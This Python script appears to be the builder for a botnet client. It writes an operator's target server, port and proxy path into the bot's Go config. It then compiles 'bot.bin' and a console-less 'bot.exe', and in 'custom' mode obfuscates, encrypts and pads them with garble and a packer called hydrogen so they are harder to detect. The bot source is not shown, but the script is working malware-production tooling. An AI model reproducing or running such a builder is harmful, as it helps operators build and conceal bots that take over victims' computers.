import json
import os
import sys
import time
import subprocess
import socket


def CheckDepend():
    depend = subprocess.check_output("""
    if ! command -v garble &>/dev/null || ! command -v upx &>/dev/null || ! command -v hydrogen &>/dev/null; then
        echo true
    fi

    """, shell=True)

    if depend.decode() != "":
        syst = subprocess.check_output(
            "cat /etc/os-release | grep ^ID=", shell=True)

        ossys = syst.decode().removeprefix(
            "ID=").removesuffix("\n")

        if ossys == "ubuntu" or ossys == "debian":  # apt
            subprocess.check_output("sudo apt update -y", shell=True)
            subprocess.check_output("sudo apt install upx -y", shell=True)
            subprocess.check_output(
                "go install mvdan.cc/garble@latest", shell=True)
            subprocess.check_output(
                "go install github.com/LsdDance/hydrogen@latest", shell=True)

        elif ossys == "manjaro" or ossys == "arch":  # pacman
            subprocess.check_output("sudo pacman -S upx", shell=True)
            subprocess.check_output(
                "go install github.com/LsdDance/hydrogen@latest", shell=True)
            subprocess.check_output(
                "go install mvdan.cc/garble@latest", shell=True)

        elif ossys == "fedora":  # dnf
            subprocess.check_output("sudo dnf install upx", shell=True)
            subprocess.check_output(
                "go install github.com/LsdDance/hydrogen@latest", shell=True)
            subprocess.check_output(
                "go install mvdan.cc/garble@latest", shell=True)
        else:
            print("Unsupported OS")
            exit(0)


def ReadConfig(path: str) -> str:
    try:
        with open(path) as jsonf:
            config = json.load(jsonf)
    except:
        print("I can't find the config file")
        exit(0)
    return config


def Build(config: str, compiler: str):

    CheckDepend()

    with open("client/config/config.go") as botconf:
        conf = botconf.read()

    result = ""
    for i in conf.split("\n"):
        if i.startswith("	TARGET_SERVER = "):
            result = conf.replace(
                i, f'	TARGET_SERVER = "{config["Bot"]["Server"]}"')
        if i.startswith("	TARGET_PORT"):
            result = result.replace(
                i, f'	TARGET_PORT   = "{config["Bot"]["Port"]}" ')
        if i.startswith("	PROXYURL ="):
            if config["Api"]["CustomPathEnabled"] == True:
                result = result.replace(
                    i, f'	PROXYURL = "http://{config["Api"]["Server"]}:{config["Api"]["Port"]}{config["Api"]["CustomPath"]}')
            else:
                result = result.replace(
                    i, f'	PROXYURL = "http://{config["Api"]["Server"]}:{config["Api"]["Port"]}/DewmDCSjihfwj"')

    os.remove("./client/config/config.go")

    with open("./client/config/config.go", "w") as file:
        file.write(result)

    os.system("""
	rm -r -f bin
	mkdir bin
	mkdir bin/linux
	mkdir bin/windows
    """)

    if compiler == "default":

        os.system("""

    cd client
	GOOS=linux go build -ldflags "-s -w" -o bot.bin .
	GOOS=windows go build -ldflags "-H windowsgui -s -w" -o bot.exe .

	cp bot.bin ../bin/linux
	cp bot.exe ../bin/windows

	rm bot.bin
	rm bot.exe


    """)

    else:
        os.system("""
        
        cd client
		GOOS=linux garble -seed=random -literals -tiny build -trimpath -o bot.bin .
        hydrogen -compress -encrypt -garbage -output bot.bin

        GOOS=windows go build -ldflags "-H windowsgui -s -w" -o bot.exe .
        hydrogen -encrypt -garbage -output bot.exe


        cp bot.bin ../bin/linux
	    cp bot.exe ../bin/windows

    	rm bot.bin
	    rm bot.exe



        """)


if __name__ == "__main__":

    if os.name != "posix":
        print("I can't work on your OS")
        exit(0)

    try:
        compiler = sys.argv[1]
    except:
        print(
            "python3 builder.py [COMPILER (default/custom) ]\nExample:\npython3 builder.py custom")
        exit(0)

    if compiler != "custom" and compiler != "default":
        print(
            "python3 builder.py [COMPILER (default/custom) ]\nExample:\npython3 builder.py custom")
        exit(0)

    config = ReadConfig("./config.json")  # U can change config dir

    print("Building...")

    Build(config, compiler)
    print("\nSuccess. Build dir: bin")
